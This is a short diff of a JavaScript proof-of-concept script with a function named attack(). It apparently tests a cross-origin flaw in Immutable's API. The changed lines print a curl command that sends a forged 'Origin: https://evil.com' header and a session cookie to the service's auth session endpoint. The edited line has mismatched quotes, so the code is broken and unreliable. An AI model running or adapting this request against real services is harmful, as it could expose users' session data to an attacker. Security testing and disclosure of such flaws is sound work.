@@ -37,7 +37,7 @@ async function attack() {
     } catch (err) {
         out.textContent += `❌ Error: ${err.message}\n\n`;
         out.textContent += 'PROOF VIA CURL (works):\n';
-        out.textContent += 'curl "https://api.immutable.com/v2/rewards/earnings" \\\n';
+        out.textContent += 'curl ""https://play.immutable.com/api/auth/session'\\\n';
         out.textContent += '  -H "Origin: https://evil.com" \\\n';
         out.textContent += '  --cookie "YOUR_SESSION_COOKIE_HERE"\n';
     }
